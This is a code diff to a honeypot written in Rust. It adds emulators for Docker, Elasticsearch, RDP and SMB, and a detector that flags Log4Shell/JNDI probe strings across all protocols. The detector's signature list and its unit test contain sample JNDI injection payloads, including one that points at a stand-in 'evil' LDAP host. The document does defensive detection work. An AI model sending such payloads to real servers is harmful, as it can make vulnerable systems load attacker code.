@@ -16,7 +16,7 @@ use tokio::sync::{Semaphore, watch};
 use crate::canary::CanaryState;
 use crate::shell::ShellRuntime;
 use crate::templates::TemplateRegistry;
-use crate::{SessionOutcome, http, mcp, mysql, protocol, redis};
+use crate::{SessionOutcome, docker, elasticsearch, http, mcp, mysql, protocol, rdp, redis, smb};
 
 /// 每连接会话共享的运行时（0.5.11 收敛：假 Shell/蜜饵/模板/反识别参数/凭证
 /// 采集开关统一入口，协议分派按 kind 取用）。
@@ -450,6 +450,27 @@ fn is_interactive_session(kind: &str, shell: Option<&ShellRuntime>) -> bool {
     }
 }
 
+/// 跨协议载荷签名（F794b① Log4Pot 思路）：全域扫 Log4Shell/JNDI 探测。
+/// 所有协议的载荷统一过一遍（攻击者不会只在 HTTP 里打 jndi），命中即定罪。
+/// 返回命中点附近的清洗片段（证据串用），无命中 None。
+fn jndi_signature_hit(payload: &str) -> Option<String> {
+    const SIGS: [&str; 3] = ["${jndi:", "${lower:jndi", "${upper:jndi"];
+    let cleaned = crate::sanitize(payload.as_bytes(), crate::MAX_PAYLOAD);
+    let lower = cleaned.to_ascii_lowercase();
+    for sig in SIGS {
+        if let Some(pos) = lower.find(sig) {
+            let start = pos.saturating_sub(40);
+            let end = (pos + 80).min(cleaned.len());
+            let (start, end) = (
+                cleaned.floor_char_boundary(start),
+                cleaned.ceil_char_boundary(end),
+            );
+            return Some(cleaned[start..end].to_string());
+        }
+    }
+    None
+}
+
 async fn handle_conn(
     mut stream: TcpStream,
     listener: String,
@@ -465,15 +486,15 @@ async fn handle_conn(
 
     // ssh/telnet 假 Shell 启用时流被仿真层消费（提前取端口）;其余按 &mut 读一包。
     // banner 解析顺序（H300/H320）：模板覆盖 > [honeypot.fingerprint] 全局默认
-    let mut ghost: Option<mcp::GhostCall> = None;
+    let mut ghost: Option<crate::GhostVerdict> = None;
     let result: std::io::Result<SessionOutcome> = match kind.as_str() {
         "ssh" if ctx.shell.as_ref().is_some_and(|rt| rt.ssh_config.is_some()) => {
             let rt = ctx.shell.clone().expect("守卫已判 Some");
-            Ok(crate::shell::ssh_shell_session(stream, rt).await)
+            Ok(crate::shell::ssh_shell_session(stream, rt, ctx.canary.as_deref()).await)
         }
         "telnet" if ctx.shell.as_ref().is_some_and(|rt| rt.telnet_enabled) => {
             let rt = ctx.shell.clone().expect("守卫已判 Some");
-            Ok(crate::shell::telnet_shell_session(stream, rt).await)
+            Ok(crate::shell::telnet_shell_session(stream, rt, ctx.canary.as_deref()).await)
         }
         "ssh" => {
             let banner = ctx
@@ -496,6 +517,26 @@ async fn handle_conn(
             }
             Err(e) => Err(e),
         },
+        // F794a：Docker Engine API 蜜罐（假 daemon + 容器创建 TTP 定罪）
+        "docker" => match http::http_json_session(&mut stream, ctx.canary.as_deref(), "Docker", docker::route).await {
+            Ok((outcome, g)) => {
+                ghost = g;
+                Ok(outcome)
+            }
+            Err(e) => Err(e),
+        },
+        // F794a：Elasticsearch 蜜罐（canary 集群形态 + 写入/脚本注入定罪）
+        "elasticsearch" => match http::http_json_session(&mut stream, ctx.canary.as_deref(), "ES", elasticsearch::route).await {
+            Ok((outcome, g)) => {
+                ghost = g;
+                Ok(outcome)
+            }
+            Err(e) => Err(e),
+        },
+        // F794a：RDP（X.224 协商 + mstshash 客户端自报捕获）
+        "rdp" => rdp::rdp_session(&mut stream).await,
+        // F794a：SMB2（NTLMSSP 挑战 + user/domain/ws 捕获 + 拒绝）
+        "smb" => smb::smb_session(&mut stream).await,
         "telnet" => protocol::telnet_session(&mut stream, &ctx.fp.telnet_greeting).await,
         "mysql" => mysql::mysql_session(&mut stream, &ctx.fp.mysql_version).await,
         "redis" => redis::redis_session(&mut stream).await,
@@ -534,6 +575,22 @@ async fn handle_conn(
             confidence: "high".into(),
             severity: g.threat,
             evidence: g.evidence,
+            rule_id: None,
+            http_hint: outcome.http_hint.clone(),
+            tls_fingerprint: None,
+            tls_ja4: None,
+        });
+    }
+
+    // F794b①：跨协议载荷签名（Log4Shell/JNDI）——零误报定罪进快路径证据面
+    if let Some(snippet) = jndi_signature_hit(&outcome.payload) {
+        bus.publish(SecurityEvent::Detection {
+            ts: now_ts(),
+            kind: "payload_signature".into(),
+            src_ip: remote_ip.clone(),
+            confidence: "high".into(),
+            severity: "high".into(),
+            evidence: format!("Log4Shell/JNDI 探测载荷: {snippet}"),
             rule_id: None,
             http_hint: outcome.http_hint.clone(),
             tls_fingerprint: None,
@@ -581,6 +638,21 @@ async fn handle_conn(
 mod tests {
     use super::*;
     use crate::shell::strip_iac;
+
+    /// F794b①：JNDI 载荷全域签名——命中/混淆变体/多字节边界不 panic
+    #[test]
+    fn jndi_signature_detects_and_bounds() {
+        assert!(jndi_signature_hit("GET /x HTTP/1.1
+User-Agent: ${jndi:ldap://evil/a}").is_some());
+        assert!(jndi_signature_hit("x ${LOWER:JNDI:ldap://a} y").is_some());
+        assert!(jndi_signature_hit("x ${upper:jndi:ldap} y").is_some());
+        assert!(jndi_signature_hit("GET / HTTP/1.1").is_none());
+        let s = "中文载荷".repeat(50) + &"${jndi:ldap://a/b}".repeat(30);
+        let hit = jndi_signature_hit(&s);
+        assert!(hit.is_some(), "多字节边界应命中且不 panic");
+        assert!(hit.unwrap().contains("${jndi:"));
+    }
+
     use std::time::Duration;
     use tokio::io::{AsyncReadExt, AsyncWriteExt};
 
